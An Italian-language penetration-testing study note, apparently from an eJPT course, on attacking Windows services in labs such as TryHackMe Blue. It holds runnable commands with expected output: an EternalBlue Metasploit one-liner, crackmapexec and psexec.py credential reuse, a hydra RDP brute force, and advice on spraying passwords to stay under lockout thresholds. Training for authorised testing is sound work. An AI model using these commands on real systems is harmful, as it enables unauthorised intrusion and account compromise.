# Windows Host Attacks

**Difficolta:** Intermediate
**Time to Master:** 2.5h
**Prerequisiti:** [../00-Fundamentals/04-Windows-Fundamentals.md](../00-Fundamentals/04-Windows-Fundamentals.md), [../04-Vulnerability-Assessment/03-CVE-CVSS-Scoring.md](../04-Vulnerability-Assessment/03-CVE-CVSS-Scoring.md)
**Lab:** INE PTS labs / TryHackMe — Blue, HTB — Legacy

---

## Obiettivo

Attaccare servizi tipici di un host Windows (RDP, SMB, servizi di rete) usando vulnerabilita note e attacchi a credenziali, come primo punto d'appoggio prima di passare a Metasploit ed exploitation vera e propria.

---

## Concetti chiave

### Superficie di attacco tipica Windows

| Servizio | Porta | Rischio comune |
|----------|-------|------------------|
| SMB | 445/139 | RCE note (MS17-010), share leggibili, null session |
| RDP | 3389 | brute force, BlueKeep (CVE-2019-0708) su versioni datate |
| WinRM | 5985/5986 | accesso remoto con credenziali valide |
| MSSQL | 1433 | credenziali deboli, xp_cmdshell per RCE |

### MS17-010 (EternalBlue) come case study

Vulnerabilita nel protocollo SMBv1 di Windows (CVE-2017-0143/0144/0145/0146/0147/0148) che permette RCE non autenticata. Colpisce sistemi Windows non patchati (tipicamente Windows 7/Server 2008 in lab). E uno degli esempi piu comuni nei lab entry-level per la sua affidabilita e semplicita di sfruttamento tramite Metasploit.

### BlueKeep (CVE-2019-0708)

Vulnerabilita RCE nel Remote Desktop Protocol (RDP) su Windows datati (7/Server 2008 R2) prima dell'autenticazione. Concettualmente simile a MS17-010 ma sul servizio RDP; da conoscere per l'esame anche solo a livello teorico.

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| nmap NSE | `nmap --script smb-vuln-ms17-010 -p 445 target` | conferma vulnerabilita | vedi [../04-Vulnerability-Assessment/02-Nmap-NSE-Scripts.md](../04-Vulnerability-Assessment/02-Nmap-NSE-Scripts.md) |
| hydra | `hydra -L users.txt -P pass.txt rdp://target` | credenziali valide | brute force RDP, vedi [03-Password-Attacks-Hydra-John-Hashcat.md](03-Password-Attacks-Hydra-John-Hashcat.md) |
| crackmapexec/netexec | `nxc smb target -u users.txt -p pass.txt` | spray credenziali su SMB | ottimo per password spraying su piu host |
| psexec.py (Impacket) | `psexec.py user:pass@target` | shell system-level | richiede credenziali admin valide |

---

## Payload / Esempi

### Esempio 1: verifica MS17-010 e sfruttamento con Metasploit

```bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.10.5
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.5; run"
```

**Output atteso:**
```
[*] Started reverse TCP handler
[+] 10.10.10.5:445 - Host is likely VULNERABLE to MS17-010!
[*] Meterpreter session 1 opened
```

**Spiegazione:** prima si conferma la vulnerabilita con NSE, poi si usa il modulo Metasploit dedicato (vedi [../07-Metasploit-Framework/03-Exploit-Modules.md](../07-Metasploit-Framework/03-Exploit-Modules.md)) per ottenere una sessione meterpreter SYSTEM.

### Esempio 2: accesso con credenziali gia note (credential reuse)

```bash
crackmapexec smb 10.10.10.0/24 -u admin -p 'Password123!'
psexec.py admin:'Password123!'@10.10.10.5
```

**Spiegazione:** se una password e stata trovata (es. in uno share SMB, vedi [../03-Enumeration/01-SMB-NetBIOS-Enumeration.md](../03-Enumeration/01-SMB-NetBIOS-Enumeration.md)), si verifica il riuso su tutta la rete prima di provare exploit piu complessi — spesso e la via piu rapida in un lab eJPT.

### Esempio 3: brute force RDP mirato

```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.5 -t 4
```

**Output atteso:**
```
[3389][rdp] host: 10.10.10.5   login: administrator   password: Summer2023!
```

**Spiegazione:** RDP tollera pochi tentativi al secondo (`-t 4` basso) per evitare lockout account; usare solo con wordlist mirate, non rockyou intero, per restare in tempi ragionevoli.

---

## Evasion / Bypass Techniques

Su host con account lockout policy attiva, il brute force puo bloccare l'utente target: preferire **password spraying** (poche password comuni su molti utenti) rispetto al brute force classico (molte password su un utente) per restare sotto la soglia di lockout.

---

## Lab Hands-On

### Lab 1: TryHackMe — Blue
**Obiettivo:** sfruttare MS17-010 su una macchina Windows 7 di lab
**Difficulty:** Facile
**Time:** 45 min

**Walkthrough breve:**
1. Scansiona e conferma la vulnerabilita SMB con NSE
2. Usa il modulo Metasploit ms17_010_eternalblue per ottenere shell
3. Da meterpreter, esegui `getuid` per confermare i privilegi ottenuti

---

## Common Mistakes

- Provare l'exploit senza aver confermato la vulnerabilita -> spreco di tempo su target non vulnerabili
- Brute force RDP con wordlist enormi senza throttling -> lockout dell'account o rilevazione da parte di sistemi di difesa
- Dimenticare di provare credenziali gia trovate su TUTTI i servizi Windows (SMB/RDP/WinRM) -> credential reuse e molto comune nei lab

---

## Link Utili

- [MS17-010 advisory — Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Impacket toolkit — GitHub](https://github.com/fortra/impacket)

---

## Connessioni

- **Prerequisito:** [../00-Fundamentals/04-Windows-Fundamentals.md](../00-Fundamentals/04-Windows-Fundamentals.md)
- **Prossimo Step:** [03-Password-Attacks-Hydra-John-Hashcat.md](03-Password-Attacks-Hydra-John-Hashcat.md)
- **Combinazione con:** [../07-Metasploit-Framework/03-Exploit-Modules.md](../07-Metasploit-Framework/03-Exploit-Modules.md)

---

## Checklist di padronanza

- [ ] So verificare e sfruttare MS17-010 con Metasploit
- [ ] So usare credenziali trovate per accesso diretto (psexec/crackmapexec)
- [ ] So eseguire un brute force RDP mirato senza causare lockout
- [ ] Conosco a livello concettuale BlueKeep

---

## Note personali

_(spazio libero)_
